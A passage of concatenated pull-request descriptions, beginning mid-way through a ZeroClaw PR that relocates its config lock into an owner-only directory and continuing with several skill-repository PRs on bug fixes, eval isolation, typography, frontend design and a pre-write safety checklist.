  (umask 0022) cargo test --locked --no-fail-fast -p zeroclaw-runtime --test '*'   14 binaries, 43 passed, 1 failed (unrelated, see below)
  ```
  `alias_cli::tests::agent_mutation_fails_closed_when_owner_has_no_rpc_endpoint` fails on master under umask `0002` (`config lifecycle directory /tmp/.tmpXXXXXX/data is writable by other users (mode 775)`) and passes on this branch under both `0002` and `0022`.

  The `zeroclaw-runtime` failures are pre-existing or unrelated:
  - Under umask `0002`, the 3 `rpc::local` IPC endpoint tests fail because their own `TempDir` fixture trips the endpoint's `require_trusted_lock_dir` (`local IPC endpoint lock directory /tmp/.tmpXXXXXX is writable by other users without the sticky bit`); that check is outside this PR. On master the lib tests fail 20 under umask `0002`: 13 `daemon::tests`, 4 `live_config_authority::tests` and these 3. This branch fixes the daemon and guard tests.
  - `tools::send_message_to_peer::tests::peer_turn_cost_scope_through_execute_boundary_attributes_recipient_and_shares_budget` polls a detached task with a bounded loop of `yield_now` calls and can run out under full-suite load. It also fails on master, and passes 3 of 3 times in isolation under each umask on this branch.
  - `wss_listener_bounds::pending_handshake_budget_sheds_then_admits_a_valid_peer` got `ECONNREFUSED` on a plain TCP connect while it deliberately fills the listener's handshake pool. Its listener takes no config lock (`LiveConfigAuthority::new`), and the file is untouched here. It passed earlier full runs of this branch, and 10 of 10 isolated runs of its binary under each umask.

  New regressions. Each one fails on the code before its fix, or when a production line it guards is reverted:
  - `live_config_authority::tests::fresh_install_under_umask_0002_is_owner_only_and_acquired`: sets umask `0002` in a subprocess and acquires on a missing `install/data`. Expects `data` and `.lifecycle` `0700`, the lock `0600`, and `install` at the default `0775`. Fails if `.lifecycle` or `data` is created with `create_dir_all`.
  - `live_config_authority::tests::existing_shared_data_dir_is_accepted_unchanged`: existing `0775` and `0777` data directories are accepted and left unchanged.
  - `live_config_authority::tests::writable_lifecycle_dir_is_refused_unchanged_with_chmod_remedy`: a `0775` or `0757` `.lifecycle` under a data path containing a space is refused with the quoted `chmod 700 '<path>'` and the filesystem note, is not repaired, and gets no lock file.
  - `live_config_authority::tests::symlinked_lifecycle_dir_is_refused_with_remove_remedy`: a `.lifecycle` symlink to an owner-only directory, and a dangling one, are refused with `rm <path>`, and no lock is created through the link. Fails if the check follows the link.
  - `live_config_authority::tests::foreign_owned_lifecycle_dir_puts_the_chown_remedy_first`: feeds the check another uid, because changing a real owner needs root. Asserts the quoted `sudo chown -R <user> '<path>'` comes before "Otherwise run ZeroClaw as <owner>", no "not with sudo", the contents and link-count reminder, and the filesystem note.
  - `live_config_authority::tests::user_owned_lifecycle_dir_under_sudo_says_run_without_sudo`: euid 0 against a user's `.lifecycle` says "Run ZeroClaw as <owner>, without sudo." and offers no `chown`.
  - `live_config_authority::tests::root_owned_lifecycle_dir_is_refused_through_the_effective_uid`: calls the production `validate_lock_dir` on `/` with the real effective uid (skipped as root). Asserts the root-owner text, that it never says to run ZeroClaw as root, the filesystem note, and that a sentence follows the command. This catches an owner check fed the owner's own uid, and the root-owner message never being chosen.
  - `live_config_authority::tests::root_run_refuses_a_lifecycle_dir_owned_by_another_user`: as root, chowns `.lifecycle` to uid 65534 and calls `acquire`. Expects the run-as-root refusal and no lock.
  - `live_config_authority::tests::data_dir_owned_by_root_explains_the_refused_lifecycle_dir`: an owned but unwritable data directory keeps the plain OS error. A root-owned one the user cannot write (`/` on Linux, `/private/var/root` on macOS) gets the data-directory refusal: "Data directory … belongs to root, so ZeroClaw cannot create its config lock directory there", the `chown` only for a directory an earlier sudo run created, and a closing sentence for one that belongs to root on purpose. `PermissionDenied` stays the root cause.
  - `live_config_authority::tests::symlinked_data_dir_is_explained_at_the_directory_it_resolves_to`: a data directory that is a symlink to such a root-owned directory gets the same refusal, naming the resolved directory in both the text and the `chown`. Fails if the owner is read with `lstat` (the link belongs to the user) or the command names the link.
  - `live_config_authority::tests::foreign_owned_data_dir_offers_the_chown_only_if_it_is_yours`: a data directory owned by another user says to run ZeroClaw as that user or point `data_dir` at your own directory first, then offers the `chown` only if the directory really is yours, with no `.lifecycle` wording and a sentence after the command.
  - `live_config_authority::tests::user_owned_data_dir_under_sudo_says_run_without_sudo`: euid 0 against a user's data directory gets the run-as-root text with the "Data directory" label and no `chown`.
  - `schema::tests::load_or_init_creates_an_owner_only_data_dir_under_umask_0002`: `Config::load_or_init` under umask `0002` creates `data/` as `0700`, leaves the install directory at `0775`, and does not create `.lifecycle`. Fails on `create_dir_all` (`left: 509` vs `right: 448`).
  - `schema::tests::create_owner_only_dir_leaves_an_existing_directory_unchanged`: an existing `0775` directory is left alone, and a file in the way is an error.

  Every remedy test also asserts that the rendered text contains no Fluent bidi isolation marks (U+2068/U+2069), which would break a pasted command. The CLI bundle already turns isolation off; switching it back on makes those assertions fail.

  The umask test spawns a child process. Spawning copies every open descriptor into the child until it execs, including another test's config lock, so the four existing tests that re-acquire the lock right after releasing it could intermittently find it still held when they ran beside the spawn (measured: master 0 of 30 module runs, this branch without the fix 1–2 of 30, 0 of 30 with the spawning test skipped or single-threaded). A test-only `RwLock` keeps the spawn and those re-acquires apart: with it, the lifecycle module passed 60 of 60 parallel runs under umask `0022` and 30 of 30 under `0002`.

  The three `zeroclaw-config` tests that simulate the pre-load lock (`an_interrupted_v2_migration_resumes_despite_the_pre_load_lock`, `an_interrupted_split_resumes_even_when_both_targets_hold_entries`, and the `legacy_plugin_recovery` integration test) now place it at `.lifecycle/config-lifecycle.lock` and still pass.
- **Beyond CI, what did you manually verify?** Real CLI runs of a debug build in throwaway `HOME`s with `ZEROCLAW_gateway__port` set to a free port. "Another user" is a sub-uid set up through a user namespace, and `/srv` (root-owned, not writable by the user) stands in for a data directory left by a sudo run.
  - Fresh install, `zeroclaw daemon` under umask `0002`: starts and serves. `.zeroclaw` is `775`, `data` and `data/.lifecycle` are `700`, and `config-lifecycle.lock` is `600`.
  - Existing `0775` `data/` (as a umask-`0002` v0.8.5 install could leave it) plus a stale `data/config-lifecycle.lock` like a master build since #10621 leaves: the daemon starts and prints nothing about permissions, and `.lifecycle` is created `700`. `data/` reads `700` afterwards. That is the IPC endpoint's existing best-effort `chmod 0700` of the socket's parent directory (`rpc/local.rs` `prepare_parent`, also in v0.8.5), not this PR. The guard itself leaves the mode alone (`existing_shared_data_dir_is_accepted_unchanged`).
  - `.lifecycle` chmodded to `775`: exit 1 with the group/other-writable refusal, its `chmod 700` line and the filesystem note; the mode stays `775`.
  - `.lifecycle` replaced by a symlink to an owner-only directory: exit 1 with the `rm` remedy, and nothing is created in the target.
  - `data/` at `755` owned by another uid: exit 1 with the data-directory refusal for another owner, then `Caused by: Permission denied (os error 13)`. No `.lifecycle` is created.
  - `data/` as a symlink to `/srv`: exit 1 with the root-owned data-directory refusal naming `/srv`; `Caused by:` prints after the closing sentence, never on the command line.
  - `zeroclaw daemon` as euid 0 (user namespace) on a `.lifecycle` owned by uid 65534: exit 1 with "Run ZeroClaw as nobody, without sudo." and no lock.
  - `zeroclaw daemon` as euid 0 (user namespace) with `data/` linked to `/srv`, whose owner the namespace cannot map (shown as `nobody`): exit 1 with the data-directory run-as-root text.
  - From earlier runs of this branch, whose code paths for these steps are unchanged: `zeroclaw config list` under umask `0002` creates `data` as `700` with no `.lifecycle`, and a later `zeroclaw daemon` under umask `0022` starts. A `data/` at `777` owned by another uid passes the guard, after which the IPC endpoint's own check on `data/` refuses it and the daemon runs without its socket; v0.8.5 behaves the same, and #11793 tracks one trust rule for the data root. Master on an existing `0775` `data/` exits 1 with `config lifecycle directory ... is writable by other users (mode 775)`.

  Not verified: macOS and Windows runs, a real root run (the root cases ran as euid 0 in a user namespace), and non-English locales (the new keys are English-only and fall back to English).
- **Visual interface evidence:** Exact plain-text output
- **Tested revision, interface, and evidence path:** master `ae9b84be07` plus this diff, `zeroclaw daemon` stderr, locale unset (English)
- **Screenshot or exact-output evidence:**
  ```text
  Error: Config lifecycle directory <T>/s1/.zeroclaw/data/.lifecycle is writable by its group or by other users (mode 775), so they could replace its config lock. ZeroClaw creates it owner-only and does not change the permissions of an existing directory. Check its contents, then restrict it and retry:
  chmod 700 <T>/s1/.zeroclaw/data/.lifecycle
  If chmod has no effect, the data directory is on a filesystem that does not keep Unix permissions; point data_dir at a local filesystem.

  Error: Config lifecycle path <T>/s1/.zeroclaw/data/.lifecycle is not a directory. ZeroClaw creates it as a directory, so something else replaced it. Check what it is, remove it, then retry:
  rm <T>/s1/.zeroclaw/data/.lifecycle

  Error: Data directory <T>/s8/.zeroclaw/data belongs to uid 165533, so ZeroClaw, running as <user>, cannot create its config lock directory there. Run ZeroClaw as uid 165533, or point data_dir at a directory of your own. If the directory really is yours, check its contents first, because chown -R also hands over anything another user hard-linked into it, then take it over and retry:
  sudo chown -R <user> <T>/s8/.zeroclaw/data
  If chown has no effect, the data directory is on a filesystem that does not keep Unix permissions; point data_dir at a local filesystem.

  Caused by:
      Permission denied (os error 13)

  Error: Data directory /srv belongs to root, so ZeroClaw cannot create its config lock directory there. If an earlier run with sudo created it, give it back and retry:
  sudo chown -R <user> /srv
  If it belongs to root on purpose, run ZeroClaw as its owner or point data_dir elsewhere.

  Caused by:
      Permission denied (os error 13)

  Error: Config lifecycle directory <T>/s9/.zeroclaw/data/.lifecycle belongs to nobody, but ZeroClaw is running as root. Run ZeroClaw as nobody, without sudo.

  Error: Data directory /srv belongs to nobody, but ZeroClaw is running as root. Run ZeroClaw as nobody, without sudo.

  Caused by:
      Permission denied (os error 13)
  ```
- **Action or changed state and observed result:** Listed under "Beyond CI" above.
- **If any command was intentionally skipped, why:** Workspace-wide clippy with `--features ci-all` and the full workspace test suite were not run locally. The changed crates (`zeroclaw-config`, `zeroclaw-runtime`) and the guard's direct callers (the root binary and `zeroclaw-gateway`) were tested under both umasks, and required CI runs the workspace set.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? Yes. ZeroClaw now creates one more directory, `data/.lifecycle`. It is owner-only, holds only the lock, and gets the ownership and mode checks the data directory had.
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No
- If any `Yes`, describe the risk and mitigation: The guard no longer checks the data directory, so a group- or world-writable `data/` is accepted again, as in v0.8.5. The lock is protected against other users who cannot write `data/` or its parents. Users who can write `data/` could already replace the databases in it, and can split or block the lock (see "Known limitations"); master had the same exposure one level up. `.lifecycle` must be a real directory (checked with `lstat`, never followed), owned by the current user and closed to group and other writes. The lock file keeps its `O_NOFOLLOW`, owner, `0600`, link-count and post-lock inode checks. The `.lifecycle` check is stricter than the IPC endpoint's `require_trusted_lock_dir` on purpose: it does not trust root-owned or sticky world-writable directories and does not follow symlinks. A sticky shared `.lifecycle` would let any user create the lock first and block startup, and a symlinked one would move the lock whenever the link is retargeted.

## Compatibility (required)

- Backward compatible? Yes, with one upgrade step. This restores v0.8.5's acceptance of any existing data directory, which v0.8.6 refuses when it is group- or world-writable. v0.8.6 locks `data/config-lifecycle.lock` (it includes a0f70b7925, #10621); this branch locks `data/.lifecycle/config-lifecycle.lock`, so the two do not exclude each other. If a v0.8.6 daemon is still running when the binary is upgraded, a new `zeroclaw agent`, `zeroclaw acp` or second `zeroclaw daemon` takes the new lock and goes ahead while the old daemon still owns config, until the old process restarts. Stop any running ZeroClaw process before upgrading from v0.8.6, as the release note says.
- Config / env / CLI surface changed? No. The lock moves from `data/config-lifecycle.lock` to `data/.lifecycle/config-lifecycle.lock`. A stale file at the old path, as v0.8.6 leaves it, is ignored and can be deleted once no v0.8.6 process is running.
- Rust/MSRV/toolchain floor changed? No
- If backward compatibility is `No` or either surface/floor question is `Yes`: exact upgrade steps for existing users: from v0.8.6, stop any running `zeroclaw daemon`, `zeroclaw agent` or `zeroclaw acp`, install v0.8.7, then start them again.

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert <sha>`. That restores the #10621 behavior: the check on the whole data directory, and the refusal under umask `0002`.
- **Feature flags or config toggles:** None
- **Observable failure symptoms:** A daemon, `zeroclaw agent`, `zeroclaw acp` or gateway that exits at startup with `Config lifecycle directory ... /.lifecycle ...`, `Config lifecycle path ... is not a directory`, or `Data directory <data> belongs to ...`. Errors from `creating config lifecycle directory <data>/.lifecycle` or `creating data directory <data>` mean the data directory is not writable by the running user, who owns it.

prs.title: fix(mcp-builder): support mcp>=2 streamable_http_client import and custom headers
prs.body:
Fixes #1668

### Problem
In `mcp>=2.0.0`, `streamablehttp_client` was renamed to `streamable_http_client`, and custom HTTP headers are configured via `create_mcp_http_client` / `http_client` rather than as a direct kwarg to `streamable_http_client`.

Because `skills/mcp-builder/scripts/connections.py` unconditionally imported `streamablehttp_client` at module scope, importing `connections` or running `evaluation.py` fails on startup when installing `requirements.txt` (which specifies `mcp>=1.1.0` without an upper bound):

```
Traceback (most recent call last):
  File ".../scripts/evaluation.py", line 19, in <module>
    from connections import create_connection
  File ".../scripts/connections.py", line 10, in <module>
    from mcp.client.streamable_http import streamablehttp_client
ImportError: cannot import name 'streamablehttp_client' from 'mcp.client.streamable_http'
```

### Solution
1. **Compatible import:** In `skills/mcp-builder/scripts/connections.py`, import `streamable_http_client` and `create_mcp_http_client` with fallback to `streamablehttp_client as streamable_http_client` for `mcp<2.0.0`.
2. **Context configuration:** In `MCPConnectionHTTP._create_context()`:
   - When `create_mcp_http_client` is available, create `http_client` with custom headers and pass to `streamable_http_client(url=self.url, http_client=http_client)`.
   - On `mcp<2.0.0`, pass `headers=self.headers` directly.
3. **Regression tests:** Added `skills/mcp-builder/scripts/test_connections.py` testing import resolution, stdio/sse/http transport factories, context manager creation, and validation error cases.

### Verification
- Ran `pytest skills/mcp-builder/scripts/test_connections.py -v`: all 5 tests passed.
- Verified `python skills/mcp-builder/scripts/evaluation.py --help` under `mcp 2.1.1` and Python 3.14: cleanly displays full usage and exits 0.
- Verified compilation with `python -m py_compile`.

prs.title: fix(skill-creator): isolate trigger evals and handle Windows and runtime failures
prs.body:
## Problem

Trigger evaluation can report false misses or invalid scores: per-worker command probes compete, select() on subprocess pipes fails on Windows, and unrelated tools stop the scan. Runtime failures also become non-triggers, incorrectly passing negative examples and misleading optimization.

Fixes #556.

## What changes

- Install one real candidate skill at `<temporary project>/.claude/skills/<name>/SKILL.md`, preserving its production name and candidate description. Parallel workers share it; concurrent runs use distinct UUID-based roots.
- Leave caller files untouched. The legacy `project_root` argument remains accepted but is no longer used.
- Reject same-name personal skill collisions, including those under `CLAUDE_CONFIG_DIR`.
- Resolve the Claude executable, including Windows npm shims. Read stdout/stderr with portable threads instead of select(). Close stdin and cap probes at eight turns.
- Keep scanning after Bash/Glob and other orientation tools. Match exact Skill names or skill-entrypoint Read paths, including Windows separators.
- Stop the probe process tree during cleanup: `taskkill /T /F` on Windows; a separate session/process group on POSIX.
- Treat error results, timeouts, truncated output and worker failures as invalid evaluations. Abort the batch instead of assigning zero trigger rates. Cancel pending work where possible; active workers finish their bounded cleanup.
- Preserve successful evaluation JSON. Initial optimization failures propagate; later failures preserve completed iterations. Empty and partial reports render correctly.
- Write candidate artifacts as UTF-8.

## Validation

Latest revision: Windows, Python 3.14.

```sh
# From skills/skill-creator
python -m unittest discover -s scripts/tests -v
uvx ruff check scripts/run_eval.py scripts/tests/test_eval_failures.py scripts/tests/test_stream_probe.py
git diff --check
```

- **21/21 tests pass.** Coverage includes artifact isolation, exact matching, late triggers, configuration collisions, invalid batch rejection, cleanup and partial-result recovery.
- A real Windows .cmd wrapper launches a Python child; the regression verifies that the child cannot continue after timeout. This test requires process-termination permissions and was run outside the restricted sandbox.
- Ruff passes for the files changed in the latest revision. Whitespace checks pass.
- Tests make no model calls and need no credentials. Instructions and limitations are in `scripts/tests/README.md`.

## Scope and limitations

The temporary project excludes caller-project files and configuration. Queries requiring local fixtures need those fixtures made available separately. Personal and managed Claude configuration is not fully isolated.

The original investigation included live routing experiments on Claude Code 2.1.149. Those historical observations are not a claim about every current version. This revision has not rerun live model evaluation or POSIX integration. The candidate uses the standard skill layout independently of legacy command behavior.

Related work: #794, #996, #1027, #1755 and #1757. This PR combines a real-skill artifact with portable stream handling, full-turn detection and explicit failure semantics.

prs.title: fix(docx): report LibreOffice timeout as an error and verify the output
prs.body:
## What changed
`skills/docx/scripts/accept_changes.py` now returns an Error when `soffice` times out instead of reporting success, and only claims success after checking that the output DOCX no longer carries revision marks (`w:ins` / `w:del` / `w:moveFrom` / `w:moveTo`) in `word/*.xml` parts.

## Why
Defect 1 in #1770: `soffice` operates in place on a copy and the macro stores/closes the document itself, so a timeout leaves the output in an unknown state (possibly untouched, possibly partly processed) while the caller was told "Successfully accepted all tracked changes". `__main__` keys on `"Error" in message`, so the process also exited 0.

## How verified
LibreOffice is not installed in this environment, so the fix is verified with mocked `subprocess.run` plus real DOCX fixtures:
- Timeout (`subprocess.TimeoutExpired`): returns an Error mentioning the timeout, never "Successfully".
- `returncode == 0` but the output still contains `<w:ins>`: returns "tracked changes remain in output document".
- `returncode == 0` with a clean output DOCX: still reports success.
- `_docx_still_has_tracked_changes`: True for each revision marker (`w:ins`, `w:del`, `w:moveFrom`, `w:moveTo`) and for a non-zip file, False for a clean DOCX.
- `python -m py_compile` clean; no new third-party imports (`zipfile` is stdlib).

The macro-setup path (`_setup_libreoffice_macro`) is untouched.

### Problem
Running \package_skill.py\ directly as a standalone script (e.g., \python skills/skill-creator/scripts/package_skill.py <skill-path>\) fails with \ModuleNotFoundError: No module named 'scripts.quick_validate'\. Additionally, the docstrings and CLI help messages contain outdated references to \utils/package_skill.py\ and \skills/public/...\.

When executed directly as a script, Python places the script's immediate directory (\skills/skill-creator/scripts\) at \sys.path[0]\, preventing the top-level \scripts\ package from being resolved.

1. Add the parent \skill-creator\ directory to \sys.path\ if not already present, allowing \ rom scripts.quick_validate import validate_skill\ to resolve under both direct script execution and module execution (\python -m scripts.package_skill\).
2. Update the docstring and CLI help usage examples to reference current repository paths (\scripts/package_skill.py\ and \skills/brand-guidelines\).

prs.title: Add document-typography skill: typographic quality control for generated documents
prs.body:
Prevents common typographic problems in AI-generated documents: orphan word wrap (1-6 words spilling onto the next line), widow paragraphs (section headers stranded at page bottom), and numbering misalignment.

These issues affect every document Claude generates. Users rarely ask for good typography, but they notice when it's bad.

**How it works**

The skill introduces a render-check-fix cycle: generate the document, convert to PDF, render pages as images, visually inspect, fix and regenerate. It also includes the M-count method — count how many capital M's (the widest character) fit on one line. Any real text will always be narrower, eliminating orphan wrap entirely.

**Included scripts**
- `measure_m_count.py` — Safe character limit per line using font metrics
- `check_orphans.py` — Reports lines at risk of orphan wrap
- `check_layout.sh` — One-command docx → PDF → page images
- `measure_line_width.py` — Visual line-width calibration

**Origin**

This skill emerged from iterative human-AI collaboration between [@PGTBoos](https://github.com/PGTBoos) and Claude. The user kept pointing out what the AI couldn't see (orphan words, widow paragraphs, layout balance) until the patterns were systematic enough to codify into a reusable skill. The M-count formula was the user's insight. The user actively wants to make LLMs more human-like, and sees this contribution as a help for both AI and humans writing skills.

- [x] SKILL.md with valid YAML frontmatter
- [x] Scripts are self-contained
- [x] Complements existing docx/pptx/pdf skills
- [x] Tested on real document generation

prs.title: Improve frontend-design skill clarity and actionability
prs.body:
## Summary

This PR revises the frontend-design skill to improve clarity, actionability, and internal coherence. The goal was to ensure every instruction is something Claude can actually follow within a single conversation, and that the skill's guidance is specific enough to steer behavior without being prescriptive.

## Background

I've been exploring Anthropic's open-source ecosystem after building a [GUI for Bloom](https://www.justinwetch.com/blog/anthropicbloom) and [proposing new behaviors](https://www.justinwetch.com/blog/10behaviorsbloom) for it. Looking through the Skills repo, the frontend-design skill caught my attention. Reading through it, I noticed a few places where the instructions, while well-intentioned, weren't quite actionable from the model's perspective.

For example, the original skill said "NEVER converge on common choices (Space Grotesk, for example) across generations" and "No design should be the same." The intent is clear: avoid repetitive patterns. But Claude can't see its other generations. Each conversation is isolated. These instructions are impossible to follow because they reference information the model doesn't have access to.

This got me thinking about what I call "model theory of mind": reasoning about what the model can actually know and how it processes instructions. A prompt can sound good to humans but be confusing or non-actionable for the model. I wrote up my thinking in more detail [here](https://www.justinwetch.com/blog/scaffold).

## Key Changes

**Coherence fixes:**
- Removed instructions assuming cross-session awareness ("never converge across generations," "no design should be the same")
- Resolved internal contradictions ("pick an extreme" conflicted with "the key is intentionality, not intensity")

**Clarity improvements:**
- Replaced vague adjectives ("beautiful, unique, interesting") with concrete guidance
- Rewrote the Typography section to focus on actionable instructions rather than aesthetic judgments
- Added specific palette directions to Color guidance (bold/saturated, moody/restrained, high-contrast/minimal)

**Structural additions:**
- Added INSTEAD block to pair positive instructions with existing NEVER guidance
- Expanded aesthetic direction list (added dark/moody, lo-fi/zine, handcrafted/artisanal)
- Expanded spatial composition guidance (z-depth, full-bleed, dramatic scale jumps)
- Unified imperative voice throughout

## Validation

I built an evaluation system to test whether the changes actually improved outputs. The setup:

- 50 representative prompts covering different design contexts (landing pages, dashboards, portfolios, menus, band pages, etc.)
- Each prompt executed twice via API: once with original skill, once with revised skill
- Puppeteer captures full-page screenshots of both outputs
- Claude Opus 4.5 judges blind (screenshots anonymized as A/B) on five criteria: Prompt Adherence, Aesthetic Fit, Visual Polish, UX & Usability, Creative Distinction

Results across the Claude 4.5 model family: Haiku showed the strongest improvement (8-2), followed by Sonnet (7-3), then Opus (6-4). Across all three tiers, the revised skill won 21 of 28 decisive comparisons (75% win rate, p = 0.006).

Interestingly, the revised skill helped smaller models more than larger ones. My hypothesis is that Opus can compensate for ambiguous instructions, while Haiku benefits more from explicit guidance.

## More Detail

For a full walkthrough of the approach, reasoning, and specific edits: [Teaching Claude to Design Better: Improving Anthropic's Frontend Design Skill](https://www.justinwetch.com/blog/improvingclaudefrontend)

Happy to discuss any of the changes or adjust based on feedback.

# Add architecture-advisor skill: pattern selection with written justification

Fourth skill from the [harness](https://github.com/jordimarsal/harness) SDD
suite (MIT) — companion to the three skills in PR #2039. Where that PR covers
*how to run* feature work (specs, dispatch, review), this one covers *the
first decision*: which core architecture pattern a service should use.

## What it does

A decision procedure, not a lecture:

1. **Three selectors** — domain complexity, team size, scaling needs — answered
   in one line each.
2. **Catalog of 8 core patterns** (layered, hexagonal, clean, CQRS,
   microservices, modular monolith, event-driven, functional core/imperative
   shell), each with what/best-for/trade-offs/when-NOT-to-use.
3. **Per-pattern detail files** with principles, data flow and a "Do Not" list —
   the list of ways each pattern actually fails in practice.
4. **Overlay tables** chosen independently: API style (REST/GraphQL/gRPC/WS),
   frontend integration, data persistence.
5. **A justification block format**: pattern + selectors + accepted trade-offs +
   rejected alternative — written down so a reviewer can challenge the
   justification, not the choice.

Default when unsure: **modular monolith** until scale proves otherwise.

# Add harness SDD suite: spec-driven development, dispatch discipline, adversarial review

Three process skills extracted from [harness](https://github.com/jordimarsal/harness) (MIT), a multi-agent Spec Driven Development harness battle-tested on real projects (an Astro portfolio site, a Kafka telemetry pipeline, a Java/Spring Boot status API).

## What's in the suite

| Skill | What it does |
|---|---|
| `spec-driven-development` | EARS-formatted requirements, 3-file specs (`requirements.md`/`design.md`/`tasks.md`), human approval gates, and **objective** requirement-to-test traceability via a mechanical checker (`check_traceability.py`: every `R<n>` must map to a real, existing test — file stem, Python function, or JS/TS test title). Exit 0/1/2, JSON protocol. |
| `agent-dispatch-discipline` | The subagent orchestration protocol: one dispatch = one batch (2–4 tasks, never 5+), minimal dispatch anatomy, on-disk evidence checks after every batch (a chat claim is not evidence), the "Nothing was written" re-dispatch opener, fresh-session restarts at ~70% context. |
| `adversarial-review-gauntlet` | Sequential adversarial review G1 correctness → G2 adversarial → G3 maintainability → G4 evidence, with a mechanical G1 gate script (`gauntlet.sh`, same protocol/exit codes as the checker, which ships vendored so the skill is self-contained). A G1 REJECT stops everything. |

## Why here

They are pure process skills (no API keys, no machine-specific paths, no binaries): exactly the "reusable workflow" category — they teach any agent a strict, verifiable way to run feature work, and they compose (the gauntlet delegates G1 to the traceability checker).

prs.title: fix(slack-gif-creator): account for text bounds when centering
prs.body:
## Problem

`draw_text(..., centered=True)` subtracts half the width and height returned by Pillow, but ignores the bounding box left/top offsets. The captions therefore sit away from their requested center. On Pillow 12.3.0, a `gyp` caption requested at (64, 64) has an ink center at y=68; `Hello\nSlack` has an ink center at y=66.

## Change

Subtract the bounding-box origin as well as half its dimensions. Keep the existing integer rounding and non-centered drawing path unchanged. Document centered single-line and multiline captions, and add two rendering regressions. The tests compare against a centered crop of the native text layout, preserving whitespace inside the font bounds rather than assuming every font has identical ink margins.

## Verification

- Both final regression tests fail on unchanged upstream `dbd4588` with Pillow 12.3.0.
- `python -m unittest discover -s tests -v` from `skills/slack-gif-creator` passes both tests with Pillow 12.3.0 and the minimum supported Pillow 10.0.0.
- Actual three-frame 128x128 GIF generated through `GIFBuilder.save` and reopened with Pillow: three frames, correct dimensions. Rendered PNG inspected. Corrected ink center y=64 for both example captions.
- Exercised on Python 3.12.15, NumPy 2.5.4, imageio 2.38.1. No changes to palette optimization, timing, frame ownership, or font selection.

This is independent of the existing gradient, ndarray-normalization, frame-snapshot, and GIF-timing contributions.

prs.title: Add blast-radius skill
prs.body:
## What

`blast-radius` — a checklist for the moment before a bulk or destructive write:
archiving users, revoking access, deleting rows, mailing a batch.

It covers the gap between a query being right about *rows* and a bulk operation being
right about *the world*. The core move is to classify every affected row into
**act / exclude / unknown** before touching any of them, where *unknown is never act*,
then check the act bucket for people the rule was never meant to catch.

## Why

Every example in the skill is a real near-miss from running an internal platform, not an
invented scenario:

- "Archive everyone with no account on our chat platform" would have archived the
  **research director** and a physician hired three weeks earlier. That signal measured
  *never joined*, not *left* — of 505 active members, exactly one had ever left.
- "Revoke the 98 stale permission grants" would have cut off the **service account** and
  the team leads. Classified, only 18 were genuinely stale.
- One batch email would have gone to someone who already held an offer, **rotating their
  token and invalidating the accept link already in their inbox** — their status field
  said otherwise.
- "78 of 80 file weekly reports, so they're working" — 3,037 of 3,392 reports were
  auto-generated drafts.

None of these were caught by being careful. They were caught by splitting a count into
named rows before trusting it.

## Contents

```
skills/blast-radius/
  SKILL.md                    instructions (113 lines)
  LICENSE.txt                 Apache-2.0
  scripts/blast-radius.sh     optional PreToolUse hook
```

`scripts/blast-radius.sh` is opt-in and does nothing on its own — hooks load from
settings, not from the skill folder, so SKILL.md carries the `settings.json` wiring. It
exists because of the trigger problem: a skill about not trusting a query only helps if
it loads, and the agent that would blindly run the query is the one that will not think
to load it. An unfiltered write returns `permissionDecision: "ask"`; a filtered bulk
write returns the checklist as `additionalContext`; read-only commands and anything
already flagged `--dry-run` stay silent. It fails open — missing `jq`, unrecognised
input or any error exits `0` silently.

The skill is useful without it; drop the script if you would rather `skills/` stay
instructions-only.

## Notes

- Layout matches the per-skill convention in `skills/` — SKILL.md + LICENSE.txt, with
  aux files under `scripts/` as eight other skills do.
- `python3 skills/skill-creator/scripts/quick_validate.py skills/blast-radius` → valid.
- Hook smoke battery: 19/19, covering unbounded writes, filtered bulk writes, read-only
  fast paths, multiple leading `VAR=value` assignments, `#` inside string literals,
  malformed input and output shape.
- Also published standalone at https://github.com/kishormorol/blast-radius

Happy to rename, trim, or restructure to fit house style.
